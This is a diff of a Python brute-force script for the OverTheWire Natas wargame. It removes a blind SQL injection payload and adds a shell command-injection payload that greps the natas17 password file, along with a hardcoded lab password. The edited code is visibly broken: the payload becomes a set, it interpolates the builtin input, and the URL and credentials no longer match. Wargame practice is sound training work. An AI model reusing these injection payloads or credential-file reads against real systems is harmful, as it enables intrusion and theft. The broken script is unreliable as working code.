@@ -7,13 +7,13 @@ import string
 import requests
 
 url = "http://natas15.natas.labs.overthewire.org/index.php?debug"
-auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
-characters = string.ascii_letters+string.digits
+auth = ("natas16", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
+characters = string.ascii_letters+string.digits+"@"+"_"+"&"
 password = ""
 
 def test_char(position, char, current_psw):
     payload = {
-        "username" : f'natas16" AND BINARY substring(password, 1, {position})= "{current_psw + char}" -- '
+        f'$(grep -i {input} /etc/natas_webpass/natas17)'
     }
     response = requests.post(url, data=payload, auth=auth)
     # True if
